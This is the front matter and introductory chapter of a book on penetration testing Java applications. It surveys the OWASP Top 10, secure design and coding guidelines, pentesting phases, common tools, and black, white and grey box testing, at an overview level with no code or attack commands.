![](images/cover.jpg)

![Cover](images/cover.jpg)

First Edition 2025

Copyright © BPB Publications, India

ISBN: 978-93-65899-351

All Rights Reserved. No part of this publication may be reproduced, distributed or transmitted in any form or by any means or stored in a database or retrieval system, without the prior written permission of the publisher with the exception to the program listings which may be entered, stored and executed in a computer system, but they can not be reproduced by the means of publication, photocopy, recording, or by any electronic and mechanical means.

LIMITS OF LIABILITY AND DISCLAIMER OF WARRANTY

The information contained in this book is true to correct and the best of author’s and publisher’s knowledge. The author has made every effort to ensure the accuracy of these publications, but publisher cannot be held responsible for any loss or damage arising from any information in this book.

All trademarks referred to in the book are acknowledged as properties of their respective owners but BPB Publications cannot guarantee the accuracy of this information.

![](images/BPB_Catalogue_QR.png)

[www.bpbonline.com](https://www.bpbonline.com)

**Dedicated to**

My Mother,
who taught me to believe in myself

# About the Author

Nancy Snoke has worked in software development and security for over 17 years as a software engineer, application security engineer, private consultant, and penetration tester. Nancy Snoke is the Cybersecurity Lead Engineer for the Penetration Testing Team at American Family Insurance. Nancy has a Computer Engineering degree and a Masters in Computer Science. She also has various pentesting certifications and has spoken at several InfoSec conferences.

# About the Reviewers

*   Sadhana Sontakke is an experienced QA automation tester with a background in Java development, Sadhana possesses a deep understanding of cybersecurity vulnerability and practical testing methodologies in Java. She has a passion for teaching and has a couple of years of experience as HOD for a BCS course at the college under the university of Pune and and a few years of experience as Co-ordinator for BSc IT at at the college under the university of Mumbai. She also had the chance to work as a technical writer for one of the companies in the US.

    Sadhana’s technical review targeted to evaluate the book’s content, practical exercises, and relevance to readers and professionals. Her technical review emphasizes the book’s practical approach, making it an essential resource for anyone interested in mastering penetration testing within the Java environment.

    Apart from this, she likes traveling and gardening very much. She is well-known by her Indian and US friends for having a green thumb.

*   Aayush Deo is a multi-faceted professional with extensive experience in delivering innovative cybersecurity concepts and strategies. With a robust background in cybersecurity, Aayush has targeted opportunities across various industries, including e-commerce, the semiconductor industry, the energy sector, banking and finance, and IT services. Having honed his expertise through years of hands-on experience, Aayush has become adept at identifying and mitigating cyber threats, ensuring the highest level of security for organizations. His career has been marked by a commitment to excellence and a proactive approach to safeguarding critical infrastructure and data.

    Throughout his professional journey, Aayush has successfully led numerous projects, implementing cutting-edge security measures and strategies that have fortified organizations against emerging cyber threats. His work across these varied industries has equipped him with a versatile skill set and a deep understanding of the unique security challenges each sector faces.

    Beyond his professional life, Aayush is passionate about hiking and swimming, which keep him grounded and inspired. Driven by a philosophy of continuous improvement and innovation, he is eager to embrace new challenges and contribute to the ever-evolving field of cybersecurity.

# Acknowledgement

I want to express my heartfelt appreciation to my husband and son for their kindness and support during the long days and nights I worked on this book.

I also want to thank my friends at Brackish Security for allowing me to use their company for the reconnaissance examples.

I want to acknowledge all the developers from The General Car Insurance who attended my original security lunch and learns in 2015: Ivan, Shane, Jessica, David, Bimba, Ignacio, John, and Brent. Those lunch and learns were my first attempt at creating content to teach security and started me down this path.

I also want to thank BPB Publications for their help in creating this book and for providing useful input throughout the revision process.

Finally, thank you to all the readers for your support and inspiration.

# Preface

From childhood, I was fascinated by technology—taking apart electronics and teaching myself basic programming as a teenager. Inspired by Isaac Asimov’s R. Daneel Olivaw, I aimed to create an AI robot. In college, I focused on artificial intelligence and natural language understanding, pursuing a PhD in the field. However, a family illness forced me to leave the program and take a job at a company where I identified insecure practices like hardcoded passwords and bypassable security constraints, though my concerns were dismissed.

While taking a grad school course, I met members of a Fortune 500 security team who encouraged my instincts. Soon after, I joined their team as a pentester, despite having no prior security experience, and developed a passion for testing web and mobile applications. After a few years, I returned to software engineering but remained deeply involved in security, integrating it into my work and pursuing certifications, conferences, and security culture initiatives.

Recognizing the link between weak security practices and poor culture, I launched developer-focused initiatives like lunch-and-learns and later led my company’s PCI DSS-mandated secure coding class. This six-week lab-based course, which I built around an intentionally insecure Java application, became the foundation for the web application section of this book. Similarly, the mobile application section originated from a conference presentation on vulnerable IoT devices and a related secure coding class. These experiences ultimately shaped the content and direction of this book.

[Chapter 1: Introduction: Java Security, Secure Coding, and Penetration Testing](#ch01.xhtml) - Java Security and Pentesting discusses the basics of Java security, including the OWASP top 10, secure coding, secure design fundamentals, and pentesting introduction.

[Chapter 2: Reconnaissance and Mapping](#ch02.xhtml) - Will discuss basic pentesting processes, including web application mapping and reconnaissance. Mapping involves using the system as a user and keeping a history for further exploration. Reconnaissance involves finding technologies and hidden data and content in a web application.

[Chapter 3: Hands-on with Web Proxies](#ch03.xhtml) - Walks through the setup and usage of two popular tools for web application pentesting. Burp Suite has a free and professional version with different offerings. OWASP ZAP is a free tool. Both offer free web proxies.

[Chapter 4: Observability with SQL Injections](#ch04.xhtml) - Examines various injection vulnerabilities, including a walkthrough of how to test for SQL injection showing how to use SQLmap. The cross-site scripting walk-through discusses reflected, stored, and Dom XSS. Then testing for command injection, XML injection, and Xpath injection are discussed.

[Chapter 5: Misconfiguration with Default Values](#ch05.xhtml) - Discusses misconfigurations and default configurations, including vulnerable JavaScript libraries and other known vulnerable components. This includes admin interfaces, default credentials, and debug and developer options.

[Chapter 6: CORS Exploitation](#ch06.xhtml) - Discusses client-side code, including validations, storage, and CORs. It will walk through bypassing client-side validations and manipulating client-side storage. An in-depth look at CORs exploitation will follow, including POC code.

[Chapter 7: Exploring Vectors with DoS Attacks](#ch07.xhtml) - Examines denial of service attack vectors, including excessive input processing, concurrency issues, wild card searches, resource exhaustion, and memory consumption. Attack walkthroughs and safeguards for protecting the environment will follow. Then XXE attack vector, which can cause a DOS, will be covered in depth.

[Chapter 8: Executing Business Logic Vulnerabilities](#ch08.xhtml) - Will discuss the common types of business logic vulnerabilities, including arbitrary file uploads, sequential process flows, and specific application rules that can be bypassed.

[Chapter 9: Authentication Protocols](#ch09.xhtml) - Discusses authentication, including vulnerable login, logout, password change, and forgot password. This chapter also examines username enumeration and brute force attacks, including an exploitation walkthrough using tools such as Burp Suite Intruder.

[Chapter 10: Session Management](#ch10.xhtml) - It will do a walk-through of using the Burp Suite sequencer tool to test for guessable session IDs. It will manually exploit session fixation and session hijackings. As SPAs and APIs sometimes use JWTs to store the session information, the chapter will conclude with JWT vulnerabilities.

[Chapter 11: Authorization Practices](#ch11.xhtml) - Will discuss authorization vulnerabilities, including missing function level access control, insecure direct object reference, privilege escalation, CSRF, and SSRF. Testing role-based access control using the Burp Suite site map tool and Burp Suite extension autorize will be walked through.

[Chapter 12: Java Deserialization Vulnerabilities](#ch12.xhtml) - Will go through manual Java deserialization vulnerability exploitation, which includes identifying, creating, and delivering the payload. Then, it will show how to use tools such as ysoserial, Metasploit, and Burp Suite to exploit these vulnerabilities.

[Chapter 13: Java Remote Method Invocation Vulnerabilities](#ch13.xhtml) - Will describe Java RMI and how it allows Java objects to invoke methods on remote systems. Then it will provide a walkthrough of exploiting an insecure RMI implementation. This will show how to use this to execute remote code and gain unauthorized access.

[Chapter 14: Java Native Interface Vulnerabilities](#ch14.xhtml) - Will describe JNI, which allows Java applications to be called by native applications or libraries. A walkthrough of an insecure JNI implementation will show how to corrupt memory and perform code execution.

[Chapter 15: Static Analysis of Java Android Applications](#ch15.xhtml) - Will show how to decompile the apk file back into Java code using apktool, dex2jar and jd-gui. Then static code analysis can be used to find secrets, discover vulnerable activities, vulnerable receivers, misuse of shared preferences, and vulnerable local database usage.

[Chapter 16: Dynamic Analysis of Java Android Applications](#ch16.xhtml) - Will show how to use an emulator to run an application in a controlled environment to test security scenarios, such as authentication, authorization and business logic. The main tools will be Android Emulator and ADB (Android Debug Bridge) to debug and exploit vulnerable intents, receivers and activities.

[Chapter 17: Network Analysis of Java Android Applications](#ch17.xhtml) - Discussed how to use Burp Suite to proxy network requests from an Android application to identify all API calls and other data communications. Certificate pinning will be discussed, as well as ways to bypass it.

# Code Bundle and Coloured Images

Please follow the link to download the

***Code Bundle*** and the ***Coloured Images*** of the book:

[https://rebrand.ly/3ef485](https://rebrand.ly/3ef485)

The code bundle for the book is also hosted on GitHub at [https://github.com/bpbpublications/Penetration-Testing-with-Java](https://github.com/bpbpublications/Penetration-Testing-with-Java). In case there’s an update to the code, it will be updated on the existing GitHub repository.

We have code bundles from our rich catalogue of books and videos available at [**https://github.com/bpbpublications**](https://github.com/bpbpublications). Check them out!

Errata

We take immense pride in our work at BPB Publications and follow best practices to ensure the accuracy of our content to provide with an indulging reading experience to our subscribers. Our readers are our mirrors, and we use their inputs to reflect and improve upon human errors, if any, that may have occurred during the publishing processes involved. To let us maintain the quality and help us reach out to any readers who might be having difficulties due to any unforeseen errors, please write to us at :

**[errata@bpbonline.com](mailto:errata@bpbonline.com)**

Your support, suggestions and feedbacks are highly appreciated by the BPB Publications’ Family.

**Join our book’s Discord space**

Join the book’s Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 1Introduction: Java Security, Secure Coding, and Penetration Testing](#contents.xhtml_ch01a)

[Introduction](#contents.xhtml_sc2_1a)

In software security, mastering the fundamentals is a crucial first step toward building robust, impenetrable systems. This chapter is your gateway to Java security, secure coding, and penetration testing. We will begin with a comprehensive exploration of the Open Worldwide Application Security Project (OWASP) Top 10, deciphering the most critical security risks that every developer and security professional must know. As we delve deeper, we will unravel the principles of secure coding and the art of secure design, paving the way for a secure-by-design approach. Additionally, we will provide an overview of penetration testing, distinguishing between white box, black box, and grey box testing, arming you with the knowledge to assess, mitigate, and fortify your Java applications against many security threats. This chapter is not just an introduction; it is your compass for navigating the path to Java security excellence.

[Structure](#contents.xhtml_sc2_2a)

This chapter discusses Java security and the general process of penetration testing, including:

*   OWASP Top 10
*   Secure design
*   Secure coding
*   Overview of penetration testing methodology
*   Standard tools for penetration testing
*   Black box testing
*   White box testing
*   Grey box testing

Each penetration testing method provides a unique perspective through which to observe a system's security posture, ensuring that the assessment is tailored to the specifics of the target environment.

[Objectives](#contents.xhtml_sc2_3a)

In this chapter, we will learn about Java application security, starting with the OWASP Top 10\. We will explore the Secure Software Development Lifecycle (SSDLC), including secure design and coding. We will explore the ins and outs of penetration testing techniques, unraveling their underlying principles, advantages, and limitations. At the end of the chapter, you will know the basic steps in a penetration test and will be able to identify and comprehend the differences between black box, grey box, and white box penetration testing. You will also understand the advantages and disadvantages of each technique.

[OWASP Top 10](#contents.xhtml_sc2_4a)

OWASP is a global community focusing on improving software security, offering free and open-source resources and tools to address web application vulnerabilities and risks. The OWASP Top 10 is a well-established standard, serving as a crucial resource in web application security since its start in 2003\. It is typically updated every few years to reflect the evolving threat landscape, with the most recent version being OWASP Top 10 2021\. The list offers a snapshot of the most critical web application security risks, providing developers and security professionals with essential insights for mitigating prevalent threats in web applications. It is widely recognized and referenced in the industry for its practical guidance.

[OWASP Top 10 2021](#contents.xhtml_sc3_5a)

The latest OWASP Top 10 includes the following vulnerabilities briefly described here:

*   Broken access control moves to the first position, showing it has the most severe web application security risk. Broken access control is when the application allows an unauthorized user to read, write, or remove information to which the user should not have access. It encompasses missing function level access control, insecure direct object reference, and privilege escalation. This is covered in more detail in [Chapter 11](#ch11.xhtml), Authorization Practices.
*   Cryptographic failures were previously known as sensitive data exposure. Cryptography is a process or algorithm that will hide a message or data so that only the intended party can read it. The renaming of this category focuses on failures related to cryptography. This category often leads to sensitive data exposure or system compromise. This includes encryption at rest and in transit. Some of the vulnerabilities included in this category would be not hashing passwords, choosing an inadequate algorithm, and not using Transport Layer Security (TLS). TLS is a security protocol designed to provide privacy and secure data transmission over the internet. Additional vulnerabilities in this category include not using the secure flag on sensitive cookies, guessable cryptographic keys, JSON Web Token (JWT) implementation that allows algorithm confusion, and more. JWTs are a standard that defines a way to use a JSON object to transmit claims between two parties. When properly implemented, it ensures data integrity. Some examples of cryptographic failures will be discussed in [Chapter 9](#ch09.xhtml), Authentication Protocols, [Chapter 11](#ch11.xhtml), Authorization Practices, and [Chapter 17](#ch17.xhtml), Network Analysis of Java Android Applications.
*   Injection is when the attacker adds extra unexpected commands to an input, and these commands are interpreted. Injection now includes cross-site scripting (XSS) and other injection techniques such as SQL Injection, command injection, XML injection, LDAP injection, etc. XSS is when the attacker adds JavaScript, which is interpreted by the browser, whereas SQL injection adds extra SQL statements that are executed in the database. Similarly, XML injection adds additional XML, which is processed, and LDAP injection adds LDAP command, which is interpreted by the LDAP server. Command injection is when an operating system command gets executed by the attacker’s malicious input. [Chapter 4](#ch04.xhtml), Observability with SQL Injection, covers a range of injection techniques. There are other injection examples in [Chapter 6](#ch06.xhtml), CORs Exploitation, and [Chapter 9](#ch09.xhtml), Authentication Protocols.
*   Insecure design is a new category for 2021, with a focus on risks related to design flaws. The aim is to bring more threat modeling, secure design patterns, and secure design principles into SSDLCs. This category will be discussed in [Chapter 7](#ch07.xhtml), Executing Business Logic Vulnerabilities, and [Chapter 9](#ch09.xhtml), Authentication Protocols.
*   Security misconfiguration now includes XML External Entities (XXE) in this category. Security misconfiguration is a cyber security issue that arises when systems or applications are unintentionally left in a vulnerable state, often due to a lack of proper safeguards or settings. This is covered in [Chapter 5](#ch05.xhtml), Misconfiguration with Default Values, and [Chapter 7](#ch07.xhtml), Exploring Vectors with DOS Attacks.
*   Vulnerable and outdated components were previously titled using components with known vulnerabilities. Vulnerable and outdated components refer to any included library in the code or software running on the web server that has published vulnerabilities or is missing security patches. This is discussed in [Chapter 5](#ch05.xhtml), Misconfiguration with Default Values.
*   Identification and authentication failures were previously called broken authentication and are sliding down from the second position as they now include identification failures. This will be discussed in [Chapter 9](#ch09.xhtml), Authentication Protocols.
*   Software and data integrity failures are a new category for 2021, focusing on making assumptions related to software updates, critical data, and continuous integration/continuous deployment (CI/CD) pipelines without verifying integrity. Insecure deserialization is now a part of this category. This will be discussed in [Chapter 12](#ch12.xhtml), Java Deserialization Vulnerabilities.
*   Security logging and monitoring failures were previously called insufficient logging and monitoring. This category has been expanded to include more failures and is challenging to test for. It will be touched on briefly in several chapters but is not discussed in depth.
*   Server-side request forgery is a security vulnerability that allows an attacker to send requests from a web server to internal or external resources, potentially leading to data exposure, service disruption, or further attacks. This vulnerability was newly added based on a community survey and will be discussed in [Chapter 11](#ch11.xhtml), Authorization Practices.

In addition to the OWASP Top 10, some of the valuable contributions and initiatives by OWASP include:

*   Cheat sheets: OWASP supplies a series of cheatsheets that offer concise and practical guidance on various aspects of application security. These cheat sheets cover topics like secure coding practices, authentication, and session management, making it easier for developers and security professionals to implement security measures.
*   Testing guides: OWASP publishes comprehensive testing guides that ensure thorough application security evaluations by outlining methodologies and techniques for assessing the security of web applications, web services, and APIs. APIs are a standardized way for an application to talk to another application. Web services are any API running on HTTP protocols..
*   Web application security testing tools:  OWASP actively supports and promotes open-source security testing tools for web applications, such as OWASP  Zed Attack Proxy (OWASP ZAP) and OWASP Dependency-Check. These tools help in scanning, testing, and securing web applications.
*   Educational resources: OWASP offers a wealth of educational resources, including webinars, training programs, and conferences, to help individuals and organizations enhance their knowledge of application security best practices.
*   Project initiatives: OWASP hosts various project initiatives that focus on different aspects of application security, such as OWASP AppSensor, a project focused on real-time application layer monitoring and response.
*   Documentation and guidelines: OWASP supplies extensive documentation, guidelines, and best practices for secure coding, secure development, and various other aspects of application security.
*   Community engagement: OWASP facilitates a global community of security professionals, developers, and researchers who collaborate and share knowledge on application security. Community events, discussions, and forums help foster collaboration and information exchange.
*   Advocacy for application security:  OWASP advocates the importance of application security and encourages organizations to adopt secure development practices and prioritize security within their software development lifecycles.

OWASP is a central hub for the application security community, supplying many resources, tools, and initiatives to promote and enhance secure application development and web security practices. It plays a critical role in raising awareness, educating professionals, and fostering collaboration to make the digital world more secure.

[Secure Software Development Lifecycle](#contents.xhtml_sc2_6a)

Secure Software Development Lifecycle encompasses methodologies and practices for integrating security into every phase of software development. The primary stages of the Software Development Lifecycle (SDLC) are the same as the Secure Software Development Lifecycle, as shown in the following figure:

![](images/Figure_1.01.png)

Figure 1.1: Secure Software Development Lifecycle

These phases and their security-specific steps are:

1. Requirements: Finding security requirements is done separately from the functional requirements. This can be done by eliciting cases that derive the security requirement from the use case. Properly eliciting security requirements at this phase ensures compliance standards and saves money.

2. Design: Secure design starts with incorporating the security requirements. Following a set of secure design principles forces developers to consider security when coding. Performing threat modeling verifies the design.

3. Development: Secure development includes following secure coding standards, secure design patterns, and frameworks, as well as following secure coding practices.

4. Testing: Secure testing includes secure code reviews, static code analysis, open-source vulnerability scans, dynamic code analysis, and manual security testing (penetration testing).

5. Deployment: Secure deployment orchestrates software deployment while incorporating security checks and controls to ensure that only secure, tested, and approved code is released to production.

6. Maintenance: Secure maintenance encompasses the ongoing process of applying prompt security updates and patches to software systems to address vulnerabilities and protect against emerging threats, ensuring the long-term security of the application.

This book provides guidance on secure coding and design principles, which are the practices and principles that emphasize writing secure code and designing software, aiming to prevent vulnerabilities and ensure robust cyber security. Other parts of the SSDLC are touched on, but not addressed in depth.

[Secure design](#contents.xhtml_sc2_7a)

Secure design is the practice of planning, architecting, and structuring software applications, primarily focusing on building security measures into the application's overall design and architecture, ensuring that security is an integral part of the system. Secure design is concerned with the high-level decisions and architectural choices made during the early stages of the development process to create a fundamentally secure software foundation.

Secure design ensures that the security requirements elicited in the requirements phase are in the design. Secure design will enforce a previously defined set of secure design principles during decision-making. Threat modeling can be employed to check the design. Some secure design principles that you may wish to include in your implementation are:

*   Defense in depth: Use a variety of security mechanisms to protect the applications as one of those might fail or have a 0-day tomorrow. Protect all parts of the application.
*   Do not trust user input: Consider all user input malicious until proven otherwise.
*   Secure by default: Security settings must be enabled in the default configuration. Users can lower security, but everyone should have maximum protection until they do not want it.
*   Least privilege: Users, service accounts, systems accounts, services, programs, and scripts should always run with minimum privileges needed to limit damage when hacked.
*   Fail securely: Do not grant access, decrypt a message, or show stack traces when an error occurs.
*   Design for system compromise: Assume the system will be compromised and make it easy to recover. Make changing cryptography keys or hashing algorithms simple. Build a mechanism to force users to change passwords after a compromise.
*   Reduce attack surface: Reduce the entry points. Turn off features, protocols, and functionality that are not needed.
*   Keep security simple: Complicated means it is hard to understand and test. There are more errors, and it is easy to configure wrong. So, keep the security as simple as possible.
*   Protect personal identifiable information (PII) and other sensitive data: Encrypt in transit. Do not store encryption keys with the data they encrypt.
*   Fault tolerance: This allows the software to continue after faults occur.
*   Fault detection: This includes system monitors and heartbeats.
*   Auditing and logging: Capture information about an attack if one occurs so we can act.

Secure designs can fix significant problems with sequential process flows, business logic vulnerabilities, and more. Secure designs do not improve lousy implementation. Poor implementation can lead to exploitable vulnerabilities and complete compromise, no matter how good the design is. So, we also need secure coding.

[Secure coding](#contents.xhtml_sc2_8a)

Secure coding refers explicitly to writing code within a software application, primarily emphasizing implementing security controls and mitigations to address potential vulnerabilities and threats.

The implementation phase should include a set of secure coding guidelines, best practices, and secure design patterns and frameworks. The following is a general list with several examples of the types of guidelines and best practices that should be included:

*   Use parameterized queries to stop SQL injections.
*   Output encodes user input when displayed in HTML to stop XSS.
*   Sanitize any input to operating systems commands.
*   Perform server-side validation on all input.
*   Input should be validated for type, range, and length.
*   Validation should handle special cases such as null, newlines, and .\.
*   Require authentication for anything not specifically intended to be public.
*   If passwords are stored, use a cryptographically strong one-way salted hash.
*   Credentials should be transmitted via the HTTP POST verb and TLS.
*   Enforce password requirements to stop easily guessable passwords.
*   Implement controls such as MFA or throttling to stop brute force password guessing.
*   By default, hide the password value from the screen to stop shoulder surfing attacks.
*   Any credentials the application uses to authenticate with other resources should be stored encrypted in a trusted location. Do not store in the source code.
*   A new session should be established at login.
*   The session should be terminated at logout.
*   Any change of role should result in a new session.
*   Switching from HTTP to HTTPS should result in a new session.
*   Protect session tokens stored in cookies by using the HTTPONLY and the secure flag.
*   Check authorization on every request.
*   Restrict access to authorized users for all protected URLs, protected functions, direct object references, services, and application data.
*   Authorization should be checked on the server side and match any web page application displays.
*   Remove comments and system help pages from web pages to avoid sharing sensitive information or implementation details.
*   Do not use client-side caching on any page with sensitive data.
*   Send all sensitive data using TLS 1.1 or above for security.
*   Perform all cryptography server-side.
*   Use a cryptographic random number generator to create the cryptography key or an algorithm like PBKDF2.
*   Do not disclose sensitive information in error responses, including system details, session identifiers, or account information.
*   Error-handling logic associated with all security controls, including cryptography, access control, authentication, and input validation, should deny access by default.
*   Log all security control failures, including those related to authentication, cryptography, input validation, and expired or invalid session tokens.
*   Do not log PII, session tokens, passwords, or cryptography keys.
*   Passwords, cryptography keys, and database connection strings should not be hard-coded. This can lead to data leakage and make things difficult to change if there is a compromise.
*   Do not include sensitive information in HTTP GET request parameters.
*   Authentication failure responses should not say which part of the authentication data was incorrect.

These guidelines may include specific libraries to use in certain situations for encryption or output encoding or specific guidelines on implementing new database queries. Throughout this book, there will be plenty of secure coding guidelines and secure code examples for you to use and teach to others.

[Overview of penetration testing methodology](#contents.xhtml_sc2_9a)

Penetration testing is a systematic process to identify and mitigate security vulnerabilities within a system or network. It simulates real-world cyberattacks to evaluate the effectiveness of security measures and uncover potential weaknesses. The method typically consists of four iterative phases, shown in [Figure 1.2](#ch01.xhtml_fig1-2):

![](images/Figure_1.02.png)

Figure 1.2: Penetration testing process

[Reconnaissance: Gathering information](#contents.xhtml_sc3_10a)

In the reconnaissance phase, the tester gathers information about the target system or application from external sources. This involves researching the target, its infrastructure, and its online presence. The primary objectives are to understand the organization's digital footprint, identify potential attack vectors, and gain insights into its potential vulnerabilities. Information sources may include public databases, social media, and DNS records.

[Mapping: Understanding the user's perspective](#contents.xhtml_sc3_11a)

Mapping is the second phase, where the tester aims to comprehend the system or application's behavior from a user's perspective. This involves mapping out the target's external-facing components, such as web applications, network architecture, and services. The goal is to understand how users interact with the target, including data flows, user interfaces, and typical usage patterns. Mapping provides the foundation for subsequent testing phases.

[Vulnerability discovery: An attacker's viewpoint](#contents.xhtml_sc3_12a)

Building upon the insights gained during mapping, the vulnerability discovery phase shifts the focus to understanding the target system or application from an attacker's perspective. Testers actively seek out potential security weaknesses and vulnerabilities that could be exploited. This involves various techniques, including automated vulnerability scanning, manual testing, and code analysis. The objective is to identify vulnerabilities such as software bugs, misconfigurations, and weak authentication mechanisms.

[Exploiting vulnerabilities: Verify and demonstrate](#contents.xhtml_sc3_13a)

In the exploitation phase, testers verify the full extent of the vulnerabilities discovered in the previous stage. They attempt to exploit these vulnerabilities to gain unauthorized access, escalate privileges, or demonstrate the potential impact of an attack. This step serves to validate the severity of vulnerabilities and their real-world implications. If successful, it provides concrete evidence that the identified issues pose a genuine risk.

[Iteration and reporting: Continuous improvement](#contents.xhtml_sc3_14a)

Penetration testing is often an iterative process. The testing process may repeat to ensure a thorough assessment if new targets, information, or vulnerabilities are discovered during any phase. Following completion, the findings are documented in a comprehensive report that evaluates the security posture, prioritized vulnerabilities, potential impact, and recommended remediation measures. This report is a valuable resource for stakeholders to improve their security defenses.

In summary, penetration testing methodology encompasses four phases: reconnaissance, mapping, vulnerability discovery, and exploitation. Each phase assists in identifying and addressing security weaknesses. This structured approach enables organizations to proactively enhance their security measures, reduce risks, and safeguard their digital assets from potential threats.

[Standard tools for penetration testing](#contents.xhtml_sc2_15a)

This section describes some of the tools commonly used by penetration testers. Different tools have different purposes, and the most common tools are described as follows:

*   Web proxies

    *   Burp Suite: A comprehensive web application security toolkit for intercepting and modifying HTTP(S) traffic, manual testing, and automated scanning.
    *   OWASP ZAP: An open-source web application security scanner and proxy tool that helps identify vulnerabilities and security issues in web applications.

    Web proxies will be covered in detail in [Chapter 3](#ch03.xhtml), Hands-on with Web Proxies.

*   Port scanners
    *   Network Mapper  (Nmap): A versatile and widely used network scanning tool for discovering open ports, services, and potential vulnerabilities on target systems.
    *   Masscan: A high-speed, asynchronous port scanner for rapid network exploration and large-scale scanning.
*   Vulnerability scanners
    *   Nessus: A robust vulnerability assessment tool that scans for vulnerabilities, misconfigurations, and security weaknesses in networked systems.
    *   Qualys: A cloud-based vulnerability management and assessment platform that provides real-time insights into a network's security posture.
*   Exploit tools
    *   Metasploit framework: A widely-used penetration testing tool that helps security professionals discover, exploit, and validate vulnerabilities in various systems.
    *   Meterpreter: A payload within Metasploit that provides advanced post-exploitation capabilities on compromised systems.
    *   Msfvenom: A Metasploit payload generator that assists in creating custom shellcode and exploit payloads.
    *   SQLMap: A powerful open-source tool for automating SQL injection detection and exploitation in web applications.
*   Custom scripts

    Custom scripts are tailored to specific tasks or targets and are often developed by penetration testers to address unique challenges or requirements during assessments. They can be written in various programming languages, such as Python, Ruby, or PowerShell, to automate tasks, exploit vulnerabilities, or gather information.

*   Proof-of-Concept (PoC) resources
    *   Exploit database  (ExploitDB): A repository of security exploits and PoC code that security researchers and penetration testers can refer to for understanding and testing vulnerabilities.
    *   GitHub: GitHub hosts numerous repositories containing security tools, scripts, and PoCs contributed by the security community.

These standard penetration testing tools and resources are essential for security professionals and penetration testers to assess and enhance the security of systems and applications. They provide the means to identify vulnerabilities, perform security assessments, and evaluate the effectiveness of security measures, ultimately resulting in a more robust and resilient cyber security posture.

[Black box testing](#contents.xhtml_sc2_16a)

Black box testing is penetration testing without knowledge of the system internals. So, based on the input and output, the tester determines how the system works and what vulnerabilities may exist. As shown in [Figure 1.3](#ch01.xhtml_fig1-3), the tester cannot see inside the black box and knows no internal information:

![](images/Figure_1.03.png)

Figure 1.3: Black box testing

The black box is opaque, yet the tester can determine what happens.

This approach closely simulates the perspective of an external hacker who lacks detailed knowledge about the internal setup of the target. As a result, black box testing aims to uncover vulnerabilities that real attackers might exploit without any privileged information.

To get started in this scenario, the tester is supplied with a scope of what should be assessed, including network addresses and ranges, websites, and sometimes credentials. The tester will perform reconnaissance to get additional information before starting testing. Reconnaissance may discover technologies, usernames, and source code.

The critical characteristics of black box testing include:

*   Real-world simulation: Black box testing mimics the approach of an actual external attacker, providing insights into how adversaries might compromise a system with no internal knowledge.
*   Focus on user perspective: Testers approach the system from an outsider's viewpoint, emphasizing the potential vulnerabilities that could be exploited through interactions available to regular users.
*   No prior information: Testers are not provided with internal documentation, source code, or details about the system's architecture, forcing them to rely solely on observable behaviors and external interactions.
*   Wide array of techniques: Black box testing employs a variety of tools and techniques, including vulnerability scanning, network analysis, web application assessment, and more, to uncover potential security weaknesses.
*   Emphasis on outcomes: Black box testing aims to identify vulnerabilities that could lead to unauthorized access, data breaches, or other security incidents rather than understanding the root causes within the code or architecture.
*   Realistic assessment: As black box testing does not rely on internal knowledge, it offers a realistic view of the system's security posture from an external standpoint.
*   Less time-consuming: Black box testing does not involve analyzing source code or internal configurations, so it can often be executed more quickly than other methodologies.

In principle, black box testing plays a crucial role in assessing the external-facing vulnerabilities of a system, allowing organizations to identify and address potential weaknesses that attackers might exploit without insider knowledge. One criticism of black box testing is that real attackers can take as long as they need for an attack, and these assessments are almost always time-boxed to a few weeks. This method helps organizations improve their defenses against external threats and provides a holistic view of their security.

[White box testing](#contents.xhtml_sc2_17a)

White box penetration testing, unlike black box, is penetration with knowledge of system internals, including source code and vulnerability scan results. As shown in [Figure 1.4](#ch01.xhtml_fig1-4), the tester can see the internal code and configuration during a white box test:

![](images/Figure_1.04.png)

Figure 1.4: White box testing

White box testing is sometimes called clear box testing or structural testing. This penetration testing methodology delves into the inner workings of a system or network. Unlike black box testing, which focuses on assessing external vulnerabilities without prior knowledge of the system's internals, white box testing involves full access to the target system's source code, architecture, and other internal details.

In white box testing, the tester approaches the assessment with an in-depth understanding of the system's design, logic, and components. This allows for a comprehensive examination of the codebase, databases, APIs, and other internal elements to identify vulnerabilities that might not be apparent from an external viewpoint. The goal is to pinpoint potential security weaknesses that arise from the system's code, configurations, and interactions between different components.

The critical characteristics of white box testing include:

*   In-depth analysis: White box testing involves thoroughly examining the system's source code, configurations, and architecture to uncover vulnerabilities deeply rooted within the system.
*   Access to internal details: Testers have access to documentation, source code, design diagrams, and other internal information, enabling them to understand how the system functions at a granular level.
*   Code review: A significant part of white box testing involves scrutinizing the source code for security flaws, coding errors, and potential vulnerabilities.
*   Focus on internal logic: White box testing emphasizes the identification of vulnerabilities that stem from how the system is designed, implemented, and interacts with different components.
*   Understanding root causes: Unlike other testing methodologies, white box testing aims to identify the vulnerabilities and the underlying reasons for their existence within the codebase.
*   Precise targeting: Testers can specifically target critical areas of the code where vulnerabilities are more likely to occur, optimizing the testing process.
*   Comprehensive assessment: By having full access to internal details, white box testing provides a holistic view of the system's security, covering various layers such as application logic, authentication mechanisms, and data handling.
*   Code quality improvement: White box testing can also contribute to improving the overall quality of the codebase by highlighting coding best practices and potential areas for optimization.

In summary, white box testing is essential for uncovering vulnerabilities deeply embedded within a system's codebase and architecture. It provides valuable insights into the internal security posture of the system and helps organizations identify and rectify vulnerabilities that may need to be detected through other testing methods.

[Grey box testing](#contents.xhtml_sc2_18a)

Grey box penetration testing combines black box techniques and white box techniques. This uses knowledge of source code and architecture as well as black box techniques used by hackers. As shown in [Figure 1.5](#ch01.xhtml_fig1-5), the tester can see the input, output, and internal information, such as code and configuration:

![](images/Figure_1.05.png)

Figure 1.5: Grey box testing

In this approach, the tester may have more limited knowledge of the system's internal workings than in white box testing or use this information sparingly, striking a balance between the full transparency of white box testing and the external perspective of black box testing.

Grey box testing aims to supply a more comprehensive assessment of a system's security posture by leveraging some internal information while still simulating the perspective of an external attacker. Testers may have partial access to documentation, architecture diagrams, or portions of the source code. This limited knowledge allows them to focus on areas likely to have vulnerabilities while also simulating how an attacker with some inside information might target the system.

The critical characteristics of grey box testing include:

*   Partial knowledge: Testers can access internal information, such as partial source code, architectural details, or system documentation, to target specific system areas more effectively.
*   External perspective with insights: Grey box testing combines the external viewpoint of black box testing with the insights gained from limited internal knowledge. This helps uncover vulnerabilities that might be missed by black-box testing.
*   Focused testing: Testers can concentrate on high-risk areas or components of the system based on partial internal knowledge, optimizing the testing process.
